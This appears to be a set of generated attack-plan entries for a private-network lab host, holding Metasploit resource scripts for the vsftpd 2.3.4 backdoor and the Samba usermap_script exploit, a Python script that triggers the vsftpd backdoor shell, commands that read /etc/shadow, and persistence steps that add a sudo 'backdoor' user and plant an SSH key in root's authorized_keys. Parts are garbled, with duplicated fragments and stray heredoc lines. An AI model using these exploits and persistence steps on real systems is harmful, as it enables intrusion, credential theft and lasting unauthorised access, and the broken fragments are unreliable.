initial_access.description: Exploit vsftpd and verify access in single msfconsole session
initial_access.command:
cat > /tmp/vsftpd_full.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.5
set RPORT 21
exploit -j
sleep 15
sessions -l
sessions -i 1 -c "id"
sessions -i 1 -c "pwd"
sessions -i 1 -c "cat /etc/shadow | head -5"
exit -y
EOF

set RPORT 21

sleep 15
sessions -l

sessions -i 1 -c "pwd"
sessions -i 1 -c "cat /etc/shadow | head -5"

EOF

persistence.description: Add SSH backdoor user via standalone exploit
persistence.command:
cat > /tmp/vsftpd_persist.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.5
set RPORT 21
exploit -j
sleep 15
sessions -i 1 -c "useradd -m -s /bin/bash backdoor"
sessions -i 1 -c "echo 'backdoor:password123' | chpasswd"
sessions -i 1 -c "usermod -aG sudo backdoor"
sessions -i 1 -c "cat /etc/passwd | grep backdoor"
exit -y
EOF

sessions -i 1 -c "cat /etc/passwd | grep backdoor"

EOF

set LPORT 4444
exploit -j
sleep 15
sessions -l
sessions -i 1 -c "id"
sessions -i 1 -c "uname -a"
exit -y
EOF

use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.5
set RPORT 139

set LPORT 4445
exploit -j
sleep 15
sessions -i 1 -c "id"
sessions -i 1 -c "sudo -l"

exit -y
EOF

initial_access.description: Use Python to trigger vsftpd backdoor directly
initial_access.command:
cat > /tmp/vsftpd_exploit.py << 'EOF'
import socket
import time

def exploit():
    # Connect to FTP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.5', 21))
    s.recv(1024)
    
    # Trigger backdoor with :) in username
    s.send(b'USER root:)\r\n')
    s.recv(1024)
    s.send(b'PASS password\r\n')
    s.close()
    
    time.sleep(2)
    
    # Connect to backdoor shell on port 6200
    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell.connect(('192.168.56.5', 6200))
    
    # Send command
    shell.send(b'id\n')
    result = shell.recv(4096).decode()
    print(result)
    
    shell.send(b'whoami\n')
    result = shell.recv(4096).decode()
    print(result)
    
    shell.close()
    return result

if __name__ == '__main__':
    try:
        exploit()
        print('SUCCESS')
    except Exception as e:
        print(f'FAILED: {e}')
EOF

persistence.description: Use shell to add SSH key
Use shell to add SSH key
persistence.command:
cat > /tmp/add_key.py << 'EOF'
import socket
import time

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.5', 21))
    s.recv(1024)
    s.send(b'USER root:)\r\n')
    s.recv(1024)
    s.send(b'PASS pass\r\n')
    s.close()
    time.sleep(2)
    
    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell.connect(('192.168.56.5', 6200))
    
    with open('/home/kali/.ssh/id_rsa.pub', 'r') as f:
        pubkey = f.read().strip()
    
    commands = [
        'mkdir -p /root/.ssh',
        'chmod 700 /root/.ssh',
        f'echo "{pubkey}" >> /root/.ssh/authorized_keys',
        'chmod 600 /root/.ssh/authorized_keys',
        'cat /root/.ssh/authorized_keys'
    ]
    
    for cmd in commands:
        shell.send(f'{cmd}\n'.encode())
        time.sleep(1)
        result = shell.recv(4096)
        print(result.decode())
    
    shell.close()

exploit()
EOF
